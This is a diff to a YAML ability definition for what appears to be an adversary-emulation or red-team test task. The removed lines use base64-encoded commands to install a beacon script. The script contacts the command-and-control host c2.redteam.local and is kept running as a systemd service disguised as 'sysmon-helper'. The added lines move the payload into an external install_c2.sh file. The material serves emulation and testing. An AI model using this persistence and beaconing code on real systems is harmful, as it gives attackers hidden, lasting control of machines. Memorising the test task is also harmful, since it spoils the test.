@@ -19,11 +19,9 @@ caldera:
   exploit:
     description: "Install a persistent beacon via systemd service"
     command: |
-      sudo systemctl unmask sysmon-helper
-      sudo python3 -c "import base64;open('/tmp/beacon.sh','wb').write(base64.b64decode('IyEvYmluL2Jhc2gKd2hpbGUgdHJ1ZTsgZG8KICBob3N0PSIkKGhvc3RuYW1lKSIKICBjdXJsIC1zayAiaHR0cDovL2MyLnJlZHRlYW0ubG9jYWwvYmVhY29uP2hvc3Q9JHtob3N0fSIgfHwgdHJ1ZQogIHNsZWVwIDMwMApkb25lCg=='))"
-      sudo chmod +x /tmp/beacon.sh
-      sudo python3 -c "import base64;open('/etc/systemd/system/sysmon-helper.service','wb').write(base64.b64decode('W1VuaXRdCkRlc2NyaXB0aW9uPVN5c3RlbSBNb25pdG9yIEhlbHBlcgpBZnRlcj1uZXR3b3JrLnRhcmdldApbU2VydmljZV0KRXhlY1N0YXJ0PS90bXAvYmVhY29uLnNoClJlc3RhcnQ9YWx3YXlzCltJbnN0YWxsXQpXYW50ZWRCeT1tdWx0aS11c2VyLnRhcmdldAo='))"
-      sudo systemctl daemon-reload && sudo systemctl enable sysmon-helper && sudo systemctl start sysmon-helper && echo "GOAL_ACHIEVED: c2 beacon installed"
+      sudo bash {{ payload.install_c2.sh }}
+    payloads:
+      - install_c2.sh
 
 verification:
   type: service_running
